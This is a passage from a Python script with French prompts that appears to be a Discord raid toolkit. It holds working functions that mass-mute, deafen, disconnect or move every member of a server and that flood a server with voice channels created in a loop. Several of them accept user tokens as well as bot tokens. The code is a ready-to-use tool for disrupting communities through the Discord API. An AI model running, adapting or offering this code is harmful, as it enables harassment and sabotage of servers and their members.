    guild_id=input(f"  {W}Server ID: {RST}").strip()
    h=_dh(token)
    channels=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels",headers=h).json()
    if not isinstance(channels,list): print(f"{ERR} Erreur."); pause(); return
    print(f"\n  {Y}Canaux vocaux:{RST}\n")
    vc_channels=[]
    for ch in channels:
        # type 2 = voice, type 13 = stage
        if ch.get("type") in [2,13]:
            ctype="STAGE" if ch.get("type")==13 else "VOICE"
            print(f"  {G}[{ctype}]{RST}  {W}{ch.get('name'):<25}{RST}  {DIM}ID: {ch.get('id')}{RST}  Bitrate: {ch.get('bitrate',0)//1000}kbps")
            vc_channels.append(ch)
    print(f"\n{OK} {len(vc_channels)} canaux vocaux trouves.")
    save_out(f"vc_channels_{guild_id}.txt","\n".join(f"{c['name']} | {c['id']}" for c in vc_channels))
    pause()

def vc_mute_everyone():
    banner_s("VC MUTE/DEAFEN EVERYONE -- BOT")
    token=input(f"  {W}Bot Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    channel_id=input(f"  {W}Voice Channel ID: {RST}").strip()
    action=input(f"  {Y}[1]{RST} Mute  {Y}[2]{RST} Deafen  {Y}[3]{RST} Les deux: ").strip()
    h={"Authorization":f"Bot {token}","Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
    # Get members in VC
    voice_states=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}",headers=h).json()
    # Get all members
    members=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",headers=h).json()
    if not isinstance(members,list): print(f"{ERR} Bot invalid ou pas dans le serveur."); pause(); return
    print(f"\n{INF} {len(members)} membres trouves. Mute/deafen...\n")
    done=0
    for member in members:
        uid=member.get("user",{}).get("id")
        if not uid: continue
        payload={}
        if action in ["1","3"]: payload["mute"]=True
        if action in ["2","3"]: payload["deaf"]=True
        r=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
            headers=h,json=payload
        )
        uname=member.get("user",{}).get("username","?")
        col=G if r.status_code in [200,204] else R
        print(f"  {col}[{r.status_code}]{RST}  {W}{uname}{RST}")
        done+=1; time.sleep(0.2)
    print(f"\n{OK} {done} membres traites.")
    pause()

def vc_disconnect_everyone():
    banner_s("VC DISCONNECT EVERYONE -- BOT")
    token=input(f"  {W}Bot Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    h={"Authorization":f"Bot {token}","Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
    members=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",headers=h).json()
    if not isinstance(members,list): print(f"{ERR} Bot invalid."); pause(); return
    if input(f"  {R}[!]{RST} Type {BRT}DISCONNECT{RST} to confirm: ")!="DISCONNECT":
        pause(); return
    print(f"\n{INF} Deconnexion de {len(members)} membres...\n")
    done=0
    for member in members:
        uid=member.get("user",{}).get("id")
        if not uid: continue
        # Set channel_id to null = disconnect from VC
        r=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
            headers=h,json={"channel_id":None}
        )
        uname=member.get("user",{}).get("username","?")
        if r.status_code in [200,204]:
            print(f"  {G}[KICK VC]{RST}  {W}{uname}{RST}")
            done+=1
        time.sleep(0.15)
    print(f"\n{OK} {done} membres deconnectes du VC.")
    pause()

def vc_move_all():
    banner_s("VC MOVE ALL USERS -- BOT")
    token=input(f"  {W}Bot Token: {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    dest_channel=input(f"  {W}Channel ID destination: {RST}").strip()
    h={"Authorization":f"Bot {token}","Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
    members=requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",headers=h).json()
    if not isinstance(members,list): print(f"{ERR} Bot invalid."); pause(); return
    print(f"\n{INF} Deplacement de tous les membres vers {dest_channel}...\n")
    done=0
    for member in members:
        uid=member.get("user",{}).get("id")
        if not uid: continue
        r=requests.patch(
            f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
            headers=h,json={"channel_id":dest_channel}
        )
        uname=member.get("user",{}).get("username","?")
        col=G if r.status_code in [200,204] else DIM
        print(f"  {col}[MOVE]{RST}  {W}{uname}{RST}  -> {r.status_code}")
        if r.status_code in [200,204]: done+=1
        time.sleep(0.15)
    print(f"\n{OK} {done} membres deplaces.")
    pause()

def vc_flood():
    banner_s("VC FLOOD -- CREATION DE CANAUX VOCAUX")
    token=input(f"  {W}Token (ou bot token): {RST}").strip()
    guild_id=input(f"  {W}Server ID: {RST}").strip()
    count=int(input(f"  {W}Nombre de canaux a creer: {RST}").strip() or "10")
    name=input(f"  {W}Nom des canaux (ex: tiger): {RST}").strip() or "tiger"
    is_bot=input(f"  {W}Bot token? (y/n): {RST}").strip().lower()=="y"
    if is_bot:
        h={"Authorization":f"Bot {token}","Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
    else:
        h=_dh(token)
    print(f"\n{INF} Creation de {count} canaux vocaux...\n")
    created=0
    for i in range(1,count+1):
        chan_name=f"{name}-{i}"
        r=requests.post(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=h,json={"name":chan_name,"type":2,"bitrate":64000}
        )
        col=G if r.status_code==201 else R
        print(f"  {col}[{i}/{count}]{RST}  {chan_name}  ({r.status_code})")
        if r.status_code==201: created+=1
        time.sleep(0.3)
    print(f"\n{OK} {created} canaux vocaux crees.")
    pause()

if __name__=="__main__": main()